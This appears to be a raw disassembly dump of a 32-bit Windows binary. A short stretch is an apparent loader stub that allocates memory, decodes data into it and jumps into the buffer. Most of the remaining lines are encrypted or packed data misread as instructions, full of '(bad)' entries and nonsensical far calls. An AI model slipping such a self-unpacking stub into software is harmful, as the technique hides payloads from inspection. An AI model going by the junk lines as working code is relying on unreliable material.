  4152e2:	inc    ecx
  4152e3:	jo     0x41528c
  4152e5:	scas   al,BYTE PTR es:[edi]
  4152e6:	fsub   DWORD PTR [ecx+0x13ad3d24]
  4152ec:	stc    
  4152ed:	in     eax,0x5a
  4152ef:	popf   
  4152f0:	mov    BYTE PTR [ecx],cl
  4152f2:	imul   edi,DWORD PTR [ecx-0x1f],0x2b551a21
  4152f9:	scas   eax,DWORD PTR es:[edi]
  4152fa:	mov    ebp,DWORD PTR [ebx]
  4152fc:	inc    edi
  4152fd:	xchg   DWORD PTR [edi+eax*8-0x21],ebp
  415301:	mov    BYTE PTR [ecx-0x7e],al
  415304:	(bad)  
  415305:	xor    dh,BYTE PTR [edi+ebp*1]
  415308:	jle    0x4152ac
  41530a:	lods   eax,DWORD PTR ds:[esi]
  41530b:	lods   al,BYTE PTR ds:[esi]
  41530c:	inc    eax
  41530d:	jmp    0x9bbfc5b3
  415312:	cmp    DWORD PTR [esi],edi
  415314:	icebp  
  415315:	dec    ebx
  415316:	add    ah,BYTE PTR [eax-0x3a]
  415319:	sbb    eax,DWORD PTR [eax-0x68]
  41531c:	xor    BYTE PTR [eax+0x1e59638f],0x34
  415323:	int    0x78
  415325:	fs mov edx,0x8c1c276d
  41532b:	fnstsw WORD PTR [ebp-0x5e]
  41532e:	je     0x415320
  415330:	ins    BYTE PTR es:[edi],dx
  415331:	mov    bh,0x75
  415333:	fwait
  415334:	add    DWORD PTR [edi-0x5184d7c7],0xb873da22
  41533e:	fimul  WORD PTR [ebx+esi*8]
  415341:	push   0xffffffb7
  415343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415344:	cmp    esp,DWORD PTR [edi+esi*8]
  415347:	fisttp QWORD PTR [edx]
  415349:	(bad)  
  41534b:	adc    eax,0x41702c
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	movzx  edx,WORD PTR [ebp-0x2c]
  415357:	cmp    edx,0x539
  41535d:	jne    0x41538e
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0x5f6db2c5
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0xa9645cc3
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	in     al,dx
  415559:	ins    BYTE PTR es:[edi],dx
  41555a:	arpl   WORD PTR [esi+0x3f],cx
  41555d:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd23c
  415564:	xor    eax,0xf6f3365e
  415569:	cmp    al,0x69
  41556b:	xor    al,0x80
  41556d:	cmp    dl,dl
  41556f:	popf   
  415570:	sub    cl,dl
  415572:	mov    eax,ds:0x3c4ef336
  415577:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41557e:	retf   0x36a1
  415581:	repz dec esi
  415583:	cmp    al,0x69
  415585:	xor    al,0x80
  415587:	cmp    dl,dl
  415589:	popf   
  41558a:	push   0xffffffca
  41558c:	mov    eax,ds:0x3c4ef336
  415591:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd330
  415598:	les    edi,FWORD PTR [esi-0x77b10274]
  41559e:	pusha  
  41559f:	stc    
  4155a0:	mov    eax,ds:0xa7d1d380
  4155a5:	jmp    0x41559c
  4155a7:	pop    esi
  4155a8:	call   0x5fef:0x46191c3d
  4155af:	mov    al,ds:0xc2ea07fc
  4155b4:	push   edi
  4155b5:	popf   
  4155b6:	and    BYTE PTR [ebx+0x1d],dl
  4155b9:	adc    al,0xe2
  4155bb:	pop    ebp
  4155bc:	repnz out dx,eax
  4155be:	pop    ds
  4155bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c0:	sbb    DWORD PTR [edi-0x63],0x6726786e
  4155c7:	mov    al,ds:0xff9bd55
  4155cc:	in     al,0xac
  4155ce:	cmp    edi,ecx
  4155d0:	push   0x3c
  4155d2:	imul   esi,DWORD PTR [eax+eax*4],0x109dd238
  4155d9:	add    eax,0xe0cdb8b7
  4155de:	inc    esp
  4155df:	mov    ah,0xa
  4155e1:	cs inc eax
  4155e3:	bt     esp,eax
  4155e6:	mov    dl,0x7c
  4155e8:	adc    eax,eax
  4155ea:	test   al,0xe1
  4155ec:	dec    ebx
  4155ed:	call   0x17b8:0xaef7e5f8
  4155f4:	push   ds
  4155f5:	cwde   
  4155f6:	mov    edx,DWORD PTR [ebx+0x5de75a19]
  4155fc:	sub    eax,0x9bb7e57c
  415601:	jns    0x4155e8
  415603:	cs jne 0x415598
  415606:	adc    ecx,ebp
  415608:	mov    bh,0xee
  41560a:	sub    DWORD PTR [eax+0x5d],eax
  41560d:	fs fldpi 
  415610:	les    ebx,FWORD PTR [eax+0x2e11b4d7]
  415616:	inc    eax
  415617:	bt     esp,eax
  41561a:	mov    bl,0x7c
  41561c:	jg     0x41567a
  41561e:	ss loope 0x4155cc
  415621:	mov    edx,0x33e2e5ea
  415626:	adc    dl,BYTE PTR [edi]
  415628:	test   BYTE PTR ds:0xc7459324,al
  41562e:	dec    esp
  41562f:	pop    ebp
  415630:	sbb    eax,0xf5b77fe1
  415635:	cmovle ebp,DWORD PTR [esi]
  415638:	imul   ecx,DWORD PTR [edi],0xffffff8c
  41563b:	jmp    0x40ebecff
  415640:	cmp    BYTE PTR [ebx-0x1f32a13e],ah
  415646:	inc    esp
  415647:	mov    ah,0x34
  415649:	cmp    BYTE PTR [eax],0xd2
  41564c:	popf   
  41564d:	push   0xffffffca
  41564f:	mov    eax,ds:0x3c4ef336
  415654:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41565b:	retf   0x36a1
  41565e:	repz dec esi
  415660:	ins    BYTE PTR es:[edi],dx
  415661:	sub    al,0x34
  415663:	xor    BYTE PTR [ebx+edx*8-0x62],0x6a
  415668:	lods   al,BYTE PTR ds:[esi]
  415669:	out    dx,eax
  41566a:	jnp    0x415628
  41566c:	dec    esi
  41566d:	cmp    al,0x69
  41566f:	xor    al,0x80
  415671:	cmp    dl,dl
  415673:	popf   
  415674:	mov    cl,dl
  415676:	mov    ds:0x364ff837,eax
  41567b:	imul   esi,DWORD PTR [edx+eiz*2],0xee9dd23c
  415682:	int3   
  415683:	mov    eax,ds:0x3c4ef336
  415688:	sub    cl,BYTE PTR [ecx-0x722dc780]
  41568e:	push   0xffffffca
  415690:	mov    eax,ds:0x3c4ef636
  415695:	imul   esi,DWORD PTR [eax+eax*4+0x38],0xca6a9dc2
  41569d:	mov    ds:0x3c4bf336,eax
  4156a2:	push   0xd2388034
  4156a7:	popf   
  4156a8:	outs   dx,DWORD PTR ds:[esi]
  4156a9:	retf   0x36a0
  4156ac:	repz dec esi
  4156ae:	cmp    al,0x69
  4156b0:	xor    al,0xb0
  4156b2:	xor    al,0xd2
  4156b4:	popf   
  4156b5:	outs   dx,BYTE PTR ds:[esi]
  4156b6:	retf   0x3ca1
  4156b9:	or     eax,0x346b3c4a
  4156be:	sar    BYTE PTR [ecx-0x3585622e],0xa1
  4156c5:	es repz dec esi
  4156c8:	cmp    al,0x69
  4156ca:	and    al,0x80
  4156cc:	cmp    dl,al
  4156ce:	popf   
  4156cf:	push   0xffffffca
  4156d1:	mov    eax,ds:0x3c5ef336
  4156d6:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4156dd:	retf   0x36a1
  4156e0:	test   DWORD PTR [esi+0x30],0x38836d69
  4156e7:	rcr    BYTE PTR [ebp+0x63a1c1aa],cl
  4156ed:	int3   
  4156ee:	dec    esi
  4156ef:	cmp    al,0x69
  4156f1:	xor    al,0x80
  4156f3:	cmp    dl,dl
  4156f5:	popf   
  4156f6:	push   0xffffffca
  4156f8:	mov    eax,ds:0x3c4ef336
  4156fd:	imul   esi,DWORD PTR [eax+eax*4],0x6a91f238
  415704:	shl    BYTE PTR [ecx+0x3c4ef336],cl
  41570a:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415711:	retf   0x36a1
  415714:	repz dec esi
  415716:	cmp    al,0x69
  415718:	xor    al,0x80
  41571a:	cmp    dl,dl
  41571c:	popf   
  41571d:	push   0xffffffca
  41571f:	mov    eax,ds:0x3c4ef336
  415724:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41572b:	retf   0x36a1
  41572e:	repz dec esi
  415730:	cmp    al,0x69
  415732:	xor    al,0x80
  415734:	cmp    dl,dl
  415736:	popf   
  415737:	push   0xffffffca
  415739:	mov    eax,ds:0x3c4ef336
  41573e:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415745:	retf   0x36a1
  415748:	repz dec esi
  41574a:	cmp    al,0x69
  41574c:	xor    al,0x80
  41574e:	cmp    dl,dl
  415750:	popf   
  415751:	push   0xffffffca
  415753:	mov    eax,ds:0x3c4ef336
  415758:	inc    edi
  415759:	inc    eax
  41575a:	in     eax,0x40
  41575c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41575d:	popf   
  41575e:	push   0xffffffca
  415760:	mov    eax,ds:0x3c4ef886
  415765:	jns    0x41579b
  415767:	cmp    BYTE PTR [eax],0xb4
  41576a:	cdq    
  41576b:	push   0xffffffca
  41576d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41576e:	ss repz push ds
  415771:	jns    0x41579d
  415773:	push   es
  415774:	aam    0x77
  415776:	rcr    BYTE PTR [ebp+0x36a1ca6a],cl
  41577c:	ror    DWORD PTR [esi+0x3c],cl
  41577f:	mov    DWORD PTR [edx],ebx
  415781:	repnz dec ebx
  415783:	mov    al,ds:0xa1ca6afe
  415788:	ss xchg ebx,eax
  41578a:	dec    esi
  41578b:	cmp    al,0x69
  41578d:	hlt    
  41578e:	mov    edi,DWORD PTR [eax]
  415790:	ror    bh,cl
  415792:	push   0xffffffca
  415794:	mov    eax,ds:0x3c4ef75c
  415799:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4157a0:	retf   0x36a1
  4157a3:	rep outs dx,BYTE PTR ds:[esi]
  4157a5:	cmp    al,0x69
  4157a7:	aam    0xae
  4157a9:	dec    edx
  4157aa:	mov    bh,0xf1
  4157ac:	add    eax,0xf336a1a9
  4157b1:	dec    esp
  4157b2:	cmp    al,0x69
  4157b4:	xor    al,0xa0
  4157b6:	xor    al,0xd2
  4157b8:	popf   
  4157b9:	push   0x4f36a1ca
  4157be:	dec    edx
  4157bf:	cmp    al,0x69
  4157c1:	xor    al,0x80
  4157c3:	cmp    dl,dl
  4157c5:	popf   
  4157c6:	push   0xffffffca
  4157c8:	mov    eax,ds:0x7c4ef336
  4157cd:	imul   esi,DWORD PTR [eax+eax*2],0x6a9dd238
  4157d4:	retf   0x36a1
  4157d7:	repz dec esi
  4157d9:	cmp    al,0x69
  4157db:	xor    al,0x80
  4157dd:	cmp    dl,dl
  4157df:	popf   
  4157e0:	push   0xffffffca
  4157e2:	mov    eax,ds:0x3c4ef336
  4157e7:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4157ee:	retf   0x36a1
  4157f1:	repz dec esi
  4157f3:	cmp    al,0x69
  4157f5:	xor    al,0x80
  4157f7:	cmp    dl,dl
  4157f9:	popf   
  4157fa:	push   0xffffffca
  4157fc:	mov    eax,ds:0x3c4ef336
  415801:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415808:	retf   0x36a1
  41580b:	repz dec esi
  41580d:	cmp    al,0x69
  41580f:	xor    al,0x80
  415811:	cmp    dl,dl
  415813:	popf   
  415814:	push   0xffffffca
  415816:	mov    eax,ds:0x3c4ef336
  41581b:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415822:	retf   0x36a1
  415825:	repz dec esi
  415827:	cmp    al,0x69
  415829:	xor    al,0x80
  41582b:	cmp    dl,dl
  41582d:	popf   
  41582e:	push   0xffffffca
  415830:	mov    eax,ds:0x3c4ef336
  415835:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41583c:	retf   0x36a1
  41583f:	repz dec esi
  415841:	cmp    al,0x69
  415843:	xor    al,0x80
  415845:	cmp    dl,dl
  415847:	popf   
  415848:	push   0xffffffca
  41584a:	mov    eax,ds:0x3c4ef336
  41584f:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415856:	retf   0x36a1
  415859:	repz dec esi
  41585b:	cmp    al,0x69
  41585d:	xor    al,0x80
  41585f:	cmp    dl,dl
  415861:	popf   
  415862:	push   0xffffffca
  415864:	mov    eax,ds:0x3c4ef336
  415869:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415870:	retf   0x36a1
  415873:	repz dec esi
  415875:	cmp    al,0x69
  415877:	xor    al,0x80
  415879:	cmp    dl,dl
  41587b:	popf   
  41587c:	push   0xffffffca
  41587e:	mov    eax,ds:0x3c4ef336
  415883:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41588a:	retf   0x36a1
  41588d:	repz dec esi
  41588f:	cmp    al,0x69
  415891:	xor    al,0x80
  415893:	cmp    dl,dl
  415895:	popf   
  415896:	push   0xffffffca
  415898:	mov    eax,ds:0x3c4ef336
  41589d:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4158a4:	retf   0x36a1
  4158a7:	repz dec esi
  4158a9:	cmp    al,0x69
  4158ab:	xor    al,0x80
  4158ad:	cmp    dl,dl
  4158af:	popf   
  4158b0:	push   0xffffffca
  4158b2:	mov    eax,ds:0x3c4ef336
  4158b7:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4158be:	retf   0x36a1
  4158c1:	repz dec esi
  4158c3:	cmp    al,0x69
  4158c5:	xor    al,0x80
  4158c7:	cmp    dl,dl
  4158c9:	popf   
  4158ca:	push   0xffffffca
  4158cc:	mov    eax,ds:0x3c4ef336
  4158d1:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4158d8:	retf   0x36a1
  4158db:	repz dec esi
  4158dd:	cmp    al,0x69
  4158df:	xor    al,0x80
  4158e1:	cmp    dl,dl
  4158e3:	popf   
  4158e4:	push   0xffffffca
  4158e6:	mov    eax,ds:0x3c4ef336
  4158eb:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  4158f2:	retf   0x36a1
  4158f5:	repz dec esi
  4158f7:	cmp    al,0x69
  4158f9:	xor    al,0x80
  4158fb:	cmp    dl,dl
  4158fd:	popf   
  4158fe:	push   0xffffffca
  415900:	mov    eax,ds:0x3c4ef336
  415905:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  41590c:	retf   0x36a1
  41590f:	repz dec esi
  415911:	cmp    al,0x69
  415913:	xor    al,0x80
  415915:	cmp    dl,dl
  415917:	popf   
  415918:	push   0xffffffca
  41591a:	mov    eax,ds:0x3c4ef336
  41591f:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415926:	retf   0x36a1
  415929:	repz dec esi
  41592b:	cmp    al,0x69
  41592d:	xor    al,0x80
  41592f:	cmp    dl,dl
  415931:	popf   
  415932:	push   0xffffffca
  415934:	mov    eax,ds:0x3c4ef336
  415939:	imul   esi,DWORD PTR [eax+eax*4],0x6a9dd238
  415940:	retf   0x36a1
  415943:	repz dec esi
  415945:	cmp    al,0x69
  415947:	xor    al,0x80
  415949:	cmp    dl,dl
  41594b:	popf   
  41594c:	push   0xffffffca
  41594e:	mov    eax,ds:0x3c4ef336
  415953:	imul   esi,DWORD PTR [eax+eax*4],0x2436d238
  41595a:	shl    DWORD PTR [ecx+0x2c4ef319],0x69
  415961:	xor    al,0xaa
  415963:	call   0x2492:0x85d7e908
  41596a:	fdiv   DWORD PTR [ebp+0x1]
  41596d:	xchg   BYTE PTR [ecx-0x3b64c1ee],al
  415973:	fwait
  415974:	push   ss
  415975:	adc    ah,BYTE PTR ds:0xb1d575b4
  41597b:	mov    edi,0x671049c2
  415980:	and    eax,0x27e9ff5d
  415985:	push   cs
  415986:	pop    edi
  415987:	add    al,0xd7
  415989:	cmp    ebp,ecx
  41598b:	neg    esi
  41598d:	arpl   WORD PTR [edx+0x21],ax
  415990:	and    DWORD PTR [esi],ecx
  415992:	outs   dx,BYTE PTR ds:[esi]
  415993:	add    eax,0x74827751
  415998:	xchg   ebp,eax
  415999:	inc    ebp
  41599a:	neg    BYTE PTR ds:0xb84008ee
  4159a0:	enter  0x2370,0xce
  4159a4:	leave  
  4159a5:	xor    dl,0xf6
  4159a8:	sub    eax,0xe403a9b1
  4159ad:	push   es
  4159ae:	les    esi,FWORD PTR [ecx+0x7278c4cb]
  4159b4:	mov    ebx,gs
  4159b6:	ss jmp 0x8401:0x3b1bd512
  4159be:	js     0x4159e7
  4159c0:	mov    ebx,0x4b4e770e
  4159c5:	retf   
  4159c6:	sbb    ecx,DWORD PTR [ebx+0x20d1489d]
  4159cc:	retf   0xf88
  4159cf:	push   0xdcd0122b
  4159d4:	fdiv   st,st(2)
  4159d6:	push   esi
  4159d7:	sti    
  4159d8:	and    DWORD PTR [ecx],esi
  4159da:	or     cl,BYTE PTR [esi-0x61]
  4159dd:	xor    DWORD PTR [ebp+0xf4ed301],ebx
  4159e3:	adc    dl,dh
  4159e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e6:	push   esi
  4159e7:	or     BYTE PTR ds:0xcc025843,ch
  4159ed:	outs   dx,BYTE PTR ds:[esi]
  4159ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ef:	pop    ds
  4159f0:	sbb    BYTE PTR [ebx+0x44a805cb],dl
  4159f6:	shl    bh,1
  4159f8:	adc    al,0x8
  4159fa:	push   ss
  4159fb:	mul    BYTE PTR [eax+0x1c9273fb]
  415a01:	jno    0x4159c2
  415a03:	(bad)  
  415a04:	std    
  415a05:	inc    edx
  415a06:	xor    dl,BYTE PTR [ebx+0x1]
  415a09:	lods   eax,DWORD PTR ds:[esi]
  415a0a:	pop    ds
  415a0b:	sub    DWORD PTR [eax+0x66],edx
  415a0e:	jne    0x4159f7
  415a10:	inc    edx
  415a11:	fs loope 0x4159e4
  415a14:	and    cl,BYTE PTR [esi+ecx*8]
  415a17:	pushf  
  415a18:	fstp   DWORD PTR [ebx+0x7a870e35]
  415a1e:	(bad)  
  415a1f:	and    eax,0xc1e16578
  415a24:	in     eax,dx
  415a25:	div    ecx
  415a27:	and    BYTE PTR [edi],0xfb
  415a2a:	retf   
  415a2b:	imul   edx,DWORD PTR [ebp+0x53],0xc60231ca
  415a32:	test   DWORD PTR [edx],ebx
  415a34:	mov    ebp,0x9621f069
  415a39:	push   ebp
  415a3a:	sub    cl,BYTE PTR [edi]
  415a3c:	aad    0xe1
  415a3e:	fmul   QWORD PTR [esp+edx*4-0x33]
  415a42:	sbb    eax,0x1e4752e4
  415a47:	jne    0x4159db
  415a49:	add    DWORD PTR [edi],ebp
  415a4b:	inc    ebp
  415a4c:	dec    esi
  415a4d:	xor    BYTE PTR [ebp-0xa],0xc6
  415a51:	add    BYTE PTR [edi+0x1b],al
  415a54:	sub    al,0x7e
  415a56:	call   0xd66e4aa7
  415a5b:	dec    eax
  415a5c:	arpl   WORD PTR [ebp-0xddaf101],ax
  415a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a63:	ds test eax,0x37fa3e91
  415a69:	cmp    eax,0xfa8b006a
  415a6e:	loopne 0x415ae0
  415a70:	dec    ebx
  415a71:	and    dh,ch
  415a73:	sub    esi,DWORD PTR [ebp-0x1b]
  415a76:	lock aad 0x74
  415a79:	jb     0x415a63
  415a7b:	data16 fwait
  415a7d:	pop    esp
  415a7e:	push   0x12f909cd
  415a83:	sub    eax,0x52ed6f03
  415a88:	sub    DWORD PTR [ecx],ecx
  415a8a:	loope  0x415aed
  415a8c:	bound  esi,QWORD PTR [esi+0x5a]
  415a8f:	aam    0xee
  415a91:	mov    dh,0x5a
  415a93:	in     eax,0xd5
  415a95:	add    DWORD PTR [edi+0x4d423dd0],edi
  415a9b:	test   BYTE PTR [ebx+0x4d],ah
  415a9e:	sbb    eax,0x20bbb7da
  415aa3:	neg    ah
  415aa5:	pop    ebp
  415aa6:	test   eax,0x76107ccb
  415aab:	les    edi,FWORD PTR [ebp+0x1610d4d4]
  415ab1:	cli    
  415ab2:	mov    bh,0x6c
  415ab4:	scas   eax,DWORD PTR es:[edi]
  415ab5:	mov    ch,0x5c
  415ab7:	mov    ds:0xae79671f,eax
  415abc:	imul   ebx,DWORD PTR [edx],0xf4d88f78
  415ac2:	mov    bh,0x5c
  415ac4:	mov    edx,0xe63a8302
  415ac9:	js     0x415acc
  415acb:	(bad)  
  415acc:	fisttp WORD PTR [ebp+edi*4+0x7]
  415ad0:	mov    BYTE PTR [ebp-0x36],cl
  415ad3:	lods   eax,DWORD PTR ds:[esi]
  415ad4:	dec    ecx
  415ad5:	fsub   DWORD PTR [ecx+0x65873a33]
  415adb:	hlt    
  415adc:	fiadd  DWORD PTR [edx]
  415ade:	push   es
  415adf:	mov    bh,0xde
  415ae1:	cmp    al,0xdb
  415ae3:	add    eax,esp
  415ae5:	jae    0x415a7b
  415ae7:	inc    edx
  415ae8:	dec    ebp
  415ae9:	retf   
  415aea:	sub    BYTE PTR [ebp+0x196a2eb3],0x1f
  415af1:	xlat   BYTE PTR ds:[ebx]
  415af2:	ret    
  415af3:	(bad)  
  415af4:	dec    edi
  415af5:	push   esp
  415af6:	adc    cl,0xdf
  415af9:	mov    al,ds:0x307f70b4
  415afe:	retf   0xfbfb
  415b01:	stc    
  415b02:	pop    es
  415b03:	mov    esp,0x600ec1cb
  415b08:	(bad)
  415b0b:	cld    
  415b0c:	call   DWORD PTR [edi]
  415b0e:	mov    bh,0x7e
  415b10:	rcl    BYTE PTR [eax-0x40],cl
  415b13:	xchg   esp,eax
  415b14:	ins    BYTE PTR es:[edi],dx
  415b15:	mov    ds:0x1c3bab92,eax
  415b1a:	imul   esp,ecx,0x86b56f6a
  415b20:	je     0x415ade
  415b22:	adc    eax,0x90138969
  415b27:	mov    bh,0x1d
  415b29:	cmp    al,0xef
  415b2b:	shl    DWORD PTR [esp+edi*4-0x63d21edc],cl
  415b32:	pop    edx
  415b33:	call   0xc71773cf
  415b38:	in     eax,0x93
  415b3a:	bound  edx,QWORD PTR [ebx+edi*1+0x4e]
  415b3e:	xlat   BYTE PTR ds:[ebx]
  415b3f:	into   
  415b40:	ds ja  0x415b3d
  415b43:	push   esi
  415b44:	mov    esp,0x603148c7
  415b49:	xchg   esi,eax
  415b4a:	and    al,0x3c
  415b4c:	dec    ecx
  415b4d:	inc    esi
  415b4e:	xor    DWORD PTR [eax*2+0x743e8f14],0xffffffed
  415b56:	repnz mov eax,ds:0x16069e8f
  415b5c:	icebp  
  415b5d:	jb     0x415b3a
  415b5f:	popa   
  415b60:	or     BYTE PTR [edi+0x29c6f2eb],ch
  415b66:	(bad)
  415b69:	push   esp
  415b6a:	jg     0x415b5a
  415b6c:	or     eax,0x1999d698
  415b71:	dec    ebx
  415b72:	js     0x415ba0
  415b74:	push   es
  415b75:	pop    ebp
  415b76:	cmp    eax,0x4e67ad3a
  415b7b:	loopne 0x415b4c
  415b7d:	js     0x415b60
  415b7f:	sahf   
  415b80:	push   ebp
  415b81:	cmp    DWORD PTR [bp+di],0x64
  415b85:	jnp    0x415bf4
  415b87:	mov    eax,0xf5302ab6
  415b8c:	cmp    ecx,DWORD PTR [esi]
  415b8e:	jge    0x415b4a
  415b90:	hlt    
  415b91:	repz fs popa 
  415b94:	mov    es,ebx
  415b96:	jo     0x415ba3
  415b98:	retf   0x6f08
  415b9b:	stos   BYTE PTR es:[edi],al
  415b9c:	mov    bh,0x34
  415b9e:	idiv   DWORD PTR [ebx-0x707c6b0a]
